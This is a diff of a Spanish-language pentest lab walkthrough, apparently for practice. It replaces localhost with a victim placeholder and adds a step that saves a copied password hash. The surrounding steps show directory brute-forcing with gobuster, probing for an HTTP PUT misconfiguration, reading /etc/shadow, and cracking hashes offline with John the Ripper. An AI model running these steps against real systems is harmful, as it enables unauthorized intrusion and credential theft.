@@ -70,14 +70,14 @@ Utilizamos herramientas de fuerza bruta de directorios desde la máquina atacant
 
 ```bash
 wget https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt
-gobuster dir -u http://localhost:8080 -w common.txt
+gobuster dir -u http://VICTIM_ID -w common.txt
 ```
 
 Se identifica que el directorio `/test/` es accesible y potencialmente vulnerable.
 
 ### 3. Para comprobar si el servidor permite el método HTTP **PUT**, lo cual supondría una mala configuración de seguridad ejecutamos el siguiente comando:
 ```bash
-curl -v -X OPTIONS http://localhost:8080/test/
+curl -v -X OPTIONS http://VICTIM_ID/test/
 ```
 **Conclusión:** La configuración del servidor responde explícitamente permitiendo el método **PUT**. Esto representa una vulnerabilidad crítica que permite la subida arbitraria de archivos al servidor sin autenticación.
 
@@ -146,6 +146,9 @@ grep user1 /etc/shadow
 ```
 
 Copiamos la línea entera y la guardamos en nuestra máquina local como hash.txt.
+```bash
+echo "LINEA_COPIADA" > hash.txt
+```
 
 4. Cracking Offline (John the Ripper): Necesitarás tener descargado rockyou.txt.
 Nota:Puedes usar tu crackeador favorito
